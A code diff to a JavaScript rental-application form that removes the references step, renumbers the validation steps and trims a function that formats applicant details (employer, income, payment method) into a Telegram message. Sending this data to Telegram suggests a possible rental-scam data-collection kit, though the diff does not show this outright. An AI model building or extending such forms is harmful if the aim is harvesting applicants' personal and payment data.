@@ -13,7 +13,6 @@ const STEPS = [
   "Personal Information",
   "Rental Information",
   "Employment",
-  "References",
   "Payment",
   "Review & Submit"
 ];
@@ -63,10 +62,6 @@ const state = {
   step: 0,
   data: {
     has_pets: false,
-    references: [
-      { name: "", relationship: "", phone: "", email: "" },
-      { name: "", relationship: "", phone: "", email: "" }
-    ],
     signature_date: new Date().toISOString().slice(0, 10)
   },
   agree: {},
@@ -146,7 +141,7 @@ function showStep(n) {
 
   renderProgress();
 
-  if (n === 5) {
+  if (n === 4) {
     renderReview();
   }
 
@@ -185,6 +180,7 @@ form.querySelectorAll("[data-key]").forEach((el) => {
 
 function renderReferences() {
   const wrap = document.getElementById("references");
+  if (!wrap) return;
 
   wrap.innerHTML = state.data.references.map((r, i) => `
     <div class="ref-block">
@@ -289,7 +285,7 @@ function renderReferences() {
   });
 }
 
-document.getElementById("addRef").addEventListener("click", () => {
+document.getElementById("addRef")?.addEventListener("click", () => {
   state.data.references.push({
     name: "",
     relationship: "",
@@ -492,7 +488,7 @@ function validateStep(step) {
     });
   }
 
-  if (step === 3) {
+  if (step === -1) {
     state.data.references.forEach((r, i) => {
       const required = i < 2;
 
@@ -534,7 +530,7 @@ function validateStep(step) {
     });
   }
 
-  if (step === 4) {
+  if (step === 3) {
     if (!state.payment_method) {
       document.getElementById(
         "paymentErr"
@@ -544,7 +540,7 @@ function validateStep(step) {
     }
   }
 
-  if (step === 5) {
+  if (step === 4) {
     [
       "signature_name",
       "signature_date"
@@ -623,12 +619,6 @@ function renderReview() {
             d.monthly_income
           ).toLocaleString()}`
         : "—"
-    ],
-    [
-      "References provided",
-      (d.references || []).filter(
-        (r) => r.name
-      ).length
     ],
     [
       "Selected payment method",
@@ -739,18 +729,6 @@ function buildTelegramMessage(d, ref, method) {
   L.push(`Employer phone: ${esc(d.employer_phone)}`);
   L.push(`Supervisor: ${esc(d.supervisor_name)}`);
   L.push(`Additional income: ${esc(d.additional_income)}`);
-  L.push("");
-  L.push("<b>— Previous Rental —</b>");
-  L.push(`Landlord: ${esc(d.prev_landlord_name)} (${esc(d.prev_landlord_phone)})`);
-  L.push(`Address: ${esc(d.prev_address)}`);
-  L.push(`Rent: ${esc(d.prev_rent)}`);
-  L.push(`Tenancy dates: ${esc(d.prev_tenancy_dates)}`);
-  L.push(`Reason for leaving: ${esc(d.prev_reason_leaving)}`);
-  L.push("");
-  L.push("<b>— References —</b>");
-  (d.references || []).forEach((r, i) => {
-    L.push(`${i + 1}. ${esc(r.name)} — ${esc(r.relationship)} — ${esc(r.phone)} — ${esc(r.email)}`);
-  });
   L.push("");
   L.push("<b>— Payment —</b>");
   L.push(`Selected method: ${esc(method ? method.name : state.payment_method)}`);
